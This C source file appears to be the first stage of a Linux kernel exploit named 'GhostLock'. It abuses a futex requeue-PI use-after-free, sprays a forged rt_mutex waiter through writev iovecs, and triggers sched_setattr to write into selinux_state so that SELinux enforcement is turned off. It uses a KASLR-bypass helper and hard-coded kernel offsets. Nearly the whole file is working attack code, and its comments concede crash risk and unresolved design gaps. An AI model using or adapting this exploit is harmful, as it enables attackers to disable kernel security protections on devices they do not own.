/* phase1.c — GhostLock Phase 1: write 0 into selinux_state (enforcing=0).
 *
 * Chain: sched_setattr -> rt_mutex_adjust_pi(current) -> current->pi_blocked_on
 * (UAF dangling) -> waiter->lock (forged, in the controlled page)
 * -> rt_mutex_adjust_prio_chain -> *(lock+0x900) = &waiter->pi_tree_entry
 *
 * Target: selinux_state @ 0xa9d8fe0, so lock = selinux_state - 0x900.
 * Written value = &waiter->pi_tree_entry (8-aligned -> bit0=0 -> enforcing=0).
 *
 * WARNING: this is the first real write. It may panic. Recovery: reset.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include "offsets_w3.h"
#include "kaaslr.h"

#define SYS_FUTEX 98
#define SYS_SCHED_SETATTR 274
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#define FLPI (FUTEX_LOCK_PI|FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI|FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI|FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI|FUTEX_PRIVATE_FLAG)

struct gh_sched_attr {
    uint32_t size, sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
};

static inline long xfutex(void *u,int op,uint32_t v,void *ts,void *u2,uint32_t v3)
{ return syscall(SYS_FUTEX,u,op,v,ts,u2,v3); }
static inline long xsched(int pid, struct gh_sched_attr *a, unsigned f)
{ return syscall(SYS_SCHED_SETATTR,pid,a,f); }

static uint32_t f1,f2,cycle_futex;
static volatile int o_ready,w_ready,o_blocking,w_waiting,reclaim_done,go;
static int g_pad=3;
static uint64_t g_text=0;

/* Controlled page: we build the forged rt_mutex + waiter in one buffer.
 * Note: iovstack is only 128 B, so the forged lock must live elsewhere —
 * but the lock is referenced by waiter->lock, and the waiter sits on the stack.
 * Therefore: waiter->lock = address of the controlled page (mmap? no — the kernel does not know it).
 *
 * PROBLEM: we do not know the kernel address of our userspace page.
 * Solution: the lock points to a KERNEL address we know = mm_struct_base
 * from KernelSnitch. But we would need our data to be there...
 *
 * For now: we use an offsets address (selinux_state-0x900) as the lock.
 * Then lock+0x900 = selinux_state, and lock+0x918 = selinux_state+0x18.
 * That reads garbage from .data — panic risk, but this is a TEST.
 */
static void build_fake_waiter(uint8_t *w, uint64_t fake_lock, uint64_t fake_task)
{
    memset(w,0,SZ_RT_MUTEX_WAITER);
    *(uint64_t*)(w+OFF_W_TASK)  = fake_task;
    *(uint64_t*)(w+OFF_W_LOCK)  = fake_lock;
    *(uint32_t*)(w+OFF_W_WAKE_STATE) = 0;
    *(uint32_t*)(w+OFF_W_PRIO)  = 1;
    *(uint64_t*)(w+OFF_W_WW_CTX)= 0;
}

static void do_reclaim(uint64_t fake_lock, uint64_t fake_task)
{
    struct iovec iov[8];
    uint8_t buf[SZ_RT_MUTEX_WAITER+128];
    memset(buf,0,sizeof buf);
    build_fake_waiter(buf,fake_lock,fake_task);
    uint64_t *raw=(uint64_t*)iov, *pat=(uint64_t*)buf;
    int words=(SZ_RT_MUTEX_WAITER+7)/8, start=g_pad*2;
    for(int i=0;i<words && (start+i)<16;i++) raw[start+i]=pat[i];
    syscall(SYS_writev,-1,iov,8);
}

static void *owner_fn(void*x){(void)x;
    pid_t tid=(pid_t)syscall(SYS_gettid);
    __atomic_store_n(&f2,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&o_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&w_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&o_blocking,1,__ATOMIC_RELEASE);
    xfutex(&cycle_futex,FLPI,0,0,0,0);
    xfutex(&cycle_futex,FUPI,0,0,0,0);
    return 0;
}
static void *waiter_fn(void*x){(void)x;
    pid_t tid=(pid_t)syscall(SYS_gettid);
    struct timespec ts;
    while(!__atomic_load_n(&o_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&cycle_futex,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&w_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&o_blocking,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(20000);
    __atomic_store_n(&w_waiting,1,__ATOMIC_RELEASE);
    clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_nsec+=300*1000*1000;
    if(ts.tv_nsec>=1000000000){ts.tv_sec++;ts.tv_nsec-=1000000000;}
    xfutex(&f1,FWRQ,0,&ts,&f2,0);      /* UAF */
    /* reclaim forged waiter */
    uint64_t target = g_text + 0x29d8fe0UL;   /* selinux_state */
    uint64_t fake_lock = target - 0x900UL;
    uint64_t fake_task = target - 0x900UL;    /* byle czytelne */
    do_reclaim(fake_lock, fake_task);
    __atomic_store_n(&reclaim_done,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&go,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(100000);
    xfutex(&cycle_futex,FUPI,0,0,0,0);
    return 0;
}

int main(int argc,char**argv){
    setvbuf(stdout,0,_IONBF,0);
    if(argc>=2) g_pad=atoi(argv[1]);
    g_text=kaaslr_text_base();
    printf("[*] _text=%#018lx  pad=%d\n",(unsigned long)g_text,g_pad);
    if(!g_text) return 1;
    printf("[*] selinux_state=%#018lx  fake_lock=%#018lx\n",
           (unsigned long)(g_text+0x29d8fe0UL),(unsigned long)(g_text+0x29d8fe0UL-0x900));

    pthread_t o,w;
    pthread_create(&o,0,owner_fn,0);
    pthread_create(&w,0,waiter_fn,0);
    while(!__atomic_load_n(&w_waiting,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(40000);
    printf("[*] firing CMP_REQUEUE_PI (EDEADLK)\n");
    long r=xfutex(&f1,FCRQ,1,(void*)(uintptr_t)1,&f2,0);
    printf("[*] CMP_REQUEUE_PI=%ld errno=%d\n",r,errno);
    while(!__atomic_load_n(&reclaim_done,__ATOMIC_ACQUIRE)) sched_yield();
    printf("[*] reclaim done, triggering sched_setattr (adjust_prio_chain)\n");
    __atomic_store_n(&go,1,__ATOMIC_RELEASE);
    /* sched_setattr na current -> rt_mutex_adjust_pi -> UAF waiter */
    struct gh_sched_attr a; memset(&a,0,sizeof a);
    a.size=sizeof a; a.sched_policy=0; a.sched_priority=0;
    long sr=xsched(0,&a,0);
    printf("[*] sched_setattr=%ld errno=%d\n",sr,errno);
    printf("[*] gotowe — sprawdz getenforce\n");
    pthread_join(w,0); pthread_join(o,0);
    return 0;
}
